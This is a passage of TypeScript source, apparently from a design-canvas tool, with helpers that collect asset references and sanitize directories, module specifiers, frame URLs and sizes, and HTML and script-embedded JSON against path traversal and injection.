  if (!name || !/^[A-Za-z]/.test(name)) { name = `Artboard${name}`.slice(0, 64); }
  if (RESERVED_COMPONENT_NAMES.has(name)) { name = `${name}Component`; }
  return name;
}

/**
 * The ref grammar `ArtifactStore` mints (`asset://<id>/assets/<sha>.<ext>`).
 * Shared by {@link collectAssetRefs} and {@link collectArtifactAssetRefs} so a
 * ref a collector finds is the same span `rewriteAssetTokens` rewrites — a
 * resolver keyed on a different slice would silently miss every asset.
 */
const ASSET_TOKEN_RE = /asset:\/\/[A-Za-z0-9._~-]+(?:\/[A-Za-z0-9._~-]+)*/g;

/** Every `asset://` ref reachable in the document, de-duplicated. */
export function collectAssetRefs(doc: DocNode): string[] {
  const refs = new Set<string>();
  const scan = (value: JsonValue | string | undefined): void => {
    if (typeof value === 'string') {
      const found = value.match(ASSET_TOKEN_RE);
      for (const m of found ?? []) { refs.add(m); }
      return;
    }
    if (Array.isArray(value)) { for (const v of value) { scan(v); } return; }
    if (value && typeof value === 'object') {
      for (const v of Object.values(value)) { scan(v as JsonValue); }
    }
  };
  for (const node of walk(doc)) {
    scan(node.text);
    if (node.props) { scan(node.props as JsonValue); }
    if (node.style) { scan(node.style as unknown as JsonValue); }
  }
  return [...refs];
}

function docUsesUiPrimitives(doc: DocNode): boolean {
  for (const node of walk(doc)) {
    if (typeof node.tag === 'string' && node.tag.startsWith('UI.')) { return true; }
  }
  return false;
}

/**
 * A workspace-relative POSIX directory, or null when the caller (possibly a
 * model) tried to escape. `MystiLocalExec` re-checks containment — this is the
 * layer that refuses before a permission card is ever raised with a hostile
 * path in it.
 */
function sanitizeDir(dir: string | undefined): string | null {
  const raw = (dir ?? CANVAS_CODE_OUTPUT_DIR).trim().replace(/\\/g, '/').replace(/^\.\//, '').replace(/\/+$/, '');
  if (!raw) { return null; }
  if (raw.startsWith('/') || /^[A-Za-z]:/.test(raw) || raw.startsWith('~')) { return null; }
  const parts = raw.split('/');
  if (parts.some(p => p === '..' || p === '.' || p === '' || /[\0<>:"|?*]/.test(p))) { return null; }
  return parts.join('/');
}

/** A module specifier safe to place inside a single-quoted import. */
function sanitizeModuleSpecifier(spec: string | undefined): string | null {
  if (!spec) { return null; }
  const trimmed = spec.trim();
  if (!trimmed || trimmed.length > 200) { return null; }
  return /^[@A-Za-z0-9._~/-]+$/.test(trimmed) ? trimmed : null;
}

/* ──────────────────────────────── helpers ──────────────────────────────── */

/** Frame dimensions are numeric attributes — never interpolate an unchecked value. */
function frameDim(value: number, fallback: number): number {
  const n = Number(value);
  if (!Number.isFinite(n) || n <= 0) { return fallback; }
  return Math.min(20000, Math.round(n));
}

function sanitizeFrame(f: ViewerFrame): ViewerFrame {
  const out: ViewerFrame = {
    title: String(f.title ?? '').slice(0, 200) || 'Untitled',
    width: frameDim(f.width, 1440),
    height: frameDim(f.height, 900),
  };
  if (typeof f.doc === 'string') { out.doc = f.doc; }
  if (typeof f.src === 'string' && isSafeRelativeUrl(f.src)) { out.src = f.src; }
  return out;
}

/**
 * A frame `src` must be a plain relative path inside the bundle. A `javascript:`
 * or absolute URL here would be a navigation the whole sandbox story assumes
 * cannot happen.
 */
function isSafeRelativeUrl(url: string): boolean {
  return /^[A-Za-z0-9._-]+(?:\/[A-Za-z0-9._-]+)*$/.test(url) && !url.includes('..');
}

function clampIndex(i: number, length: number): number {
  if (!Number.isFinite(i) || length <= 0) { return 0; }
  return Math.max(0, Math.min(length - 1, Math.floor(i)));
}

function clampNumber(v: number | undefined, min: number, max: number, fallback: number): number {
  const n = Number(v);
  if (!Number.isFinite(n)) { return fallback; }
  return Math.max(min, Math.min(max, n));
}

function numberOr(v: unknown, fallback: number): number {
  return typeof v === 'number' && Number.isFinite(v) ? v : fallback;
}

function withUnsafeEval(csp: string): string {
  return csp.replace("script-src 'unsafe-inline'", "script-src 'unsafe-inline' 'unsafe-eval'");
}

/**
 * Serialize for a `<script type="application/json">` block. `<` becomes the
 * valid JSON escape `<`, so no value can emit `</script` and break out, and
 * a `<!--` inside a value cannot open a comment that swallows the document.
 * (Same rule as `CanvasSandbox`'s bootstrap block, which keeps it private.)
 */
function jsonForScript(value: unknown): string {
  let json: string;
  try {
    json = JSON.stringify(value) ?? 'null';
  } catch {
    json = 'null';
  }
  return json.replace(/</g, '\\u003c');
}

function toBase64(buffer: unknown): string {
  if (typeof buffer === 'string') { return buffer; }
  if (buffer && typeof (buffer as { toString(enc: string): string }).toString === 'function') {
    return (buffer as { toString(enc: string): string }).toString('base64');
  }
  return '';
}

function escapeHtml(s: string): string {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function escapeAttr(s: string): string {
  return String(s).replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
}
